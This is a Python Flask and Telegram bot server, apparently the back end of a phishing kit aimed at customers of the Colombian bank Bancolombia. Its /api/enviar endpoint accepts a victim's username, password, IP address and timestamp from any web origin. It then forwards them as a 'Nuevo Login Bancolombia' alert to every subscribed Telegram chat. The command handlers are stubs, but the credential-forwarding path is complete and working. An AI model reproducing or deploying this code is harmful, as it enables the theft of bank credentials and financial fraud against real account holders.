# bot_server.py
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, ContextTypes
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
import os
import asyncio

# Variables de entorno
TOKEN_BOT = os.getenv('TELEGRAM_TOKEN')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

# Flask
app = Flask(__name__)
CORS(app)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///suscriptores.db')
db = SQLAlchemy(app)

# Modelo (igual que antes)
class Suscriptor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    chat_id = db.Column(db.String(50), unique=True, nullable=False)
    username = db.Column(db.String(100))
    nombre = db.Column(db.String(100))
    activo = db.Column(db.Boolean, default=True)

with app.app_context():
    db.create_all()

# Bot global
bot_app = Application.builder().token(TOKEN_BOT).build()

# Comandos (igual que antes)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Tu código existente...
    pass

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Tu código existente...
    pass

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Tu código existente...
    pass

bot_app.add_handler(CommandHandler("start", start))
bot_app.add_handler(CommandHandler("stop", stop))
bot_app.add_handler(CommandHandler("status", status))

# ========== WEBHOOK ENDPOINT ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    """Recibe updates de Telegram vía webhook"""
    json_data = request.get_json()
    update = Update.de_json(json_data, bot_app.bot)
    asyncio.run(bot_app.process_update(update))
    return jsonify({'ok': True})

# ========== API ENDPOINTS ==========
@app.route('/api/enviar', methods=['POST'])
def enviar_a_suscriptores():
    data = request.json
    
    mensaje = f"""
🔐 *Nuevo Login Bancolombia*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario:* `{data['usuario']}`
🔑 *Clave:* `{data['clave']}`
━━━━━━━━━━━━━━━━━━━━━━
📱 *IP:* {data['ip']}
🕐 *Fecha:* {data['fecha']}
    """
    
    suscriptores = Suscriptor.query.filter_by(activo=True).all()
    enviados = 0
    
    for suscriptor in suscriptores:
        try:
            asyncio.run(bot_app.bot.send_message(
                chat_id=suscriptor.chat_id,
                text=mensaje,
                parse_mode='Markdown'
            ))
            enviados += 1
        except:
            pass
    
    return jsonify({'success': True, 'enviados': enviados})

@app.route('/api/suscriptores', methods=['GET'])
def listar_suscriptores():
    suscriptores = Suscriptor.query.filter_by(activo=True).all()
    return jsonify({
        'total': len(suscriptores),
        'suscriptores': [{'chat_id': s.chat_id, 'username': s.username} for s in suscriptores]
    })

@app.route('/')
def health():
    return jsonify({'status': 'running', 'bot': 'active'})

if __name__ == '__main__':
    # Configurar webhook al iniciar
    asyncio.run(bot_app.bot.set_webhook(url=WEBHOOK_URL))
    
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

